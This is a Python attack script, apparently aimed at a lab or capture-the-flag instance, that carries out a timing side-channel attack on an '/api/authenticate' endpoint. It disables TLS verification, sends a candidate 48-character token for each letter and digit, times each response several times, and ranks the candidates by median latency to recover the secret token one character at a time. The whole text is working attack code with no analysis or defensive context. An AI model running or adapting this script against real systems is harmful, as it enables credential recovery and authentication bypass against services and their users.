import requests
import statistics
import string
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io/api/authenticate"
session = requests.Session()
session.verify = False

def query(token: str, delay: float = 3.0):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = session.post(BASE_URL, json={"token": token}, timeout=15)
            elapsed = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                time.sleep(3.5)
                continue
            if r.status_code == 200:
                print(f"\n[!!!] 200 OK: {token} -> {r.text}")
                return elapsed, 200, r.text
            return elapsed, r.status_code, r.text
        except Exception as e:
            time.sleep(3.5)

# Let's test a subset of characters: '0', 'a', 'Z', 'h', 'z', 'U', 'w', 'C', 'O', 'u', 'A', 'G'
candidates = list(string.ascii_letters + string.digits)
# Test each with 3 samples, delay = 3.0s
print(f"Testing {len(candidates)} candidates with 3 samples each (delay=3.0s)...")

scores = {}
for i, c in enumerate(candidates):
    token = c + "0" * 47
    samples = []
    for s in range(3):
        elapsed, code, text = query(token, delay=3.0)
        samples.append(elapsed)
    med = statistics.median(samples)
    scores[c] = (med, samples)
    print(f"[{i+1}/{len(candidates)}] Char '{c}': med={med:.2f}ms samples={[round(x,1) for x in samples]}")

sorted_scores = sorted(scores.items(), key=lambda x: x[1][0], reverse=True)
print("\n=== TOP 10 CANDIDATES ===")
for c, (med, samples) in sorted_scores[:10]:
    print(f"'{c}': {med:.2f}ms {[round(x,1) for x in samples]}")
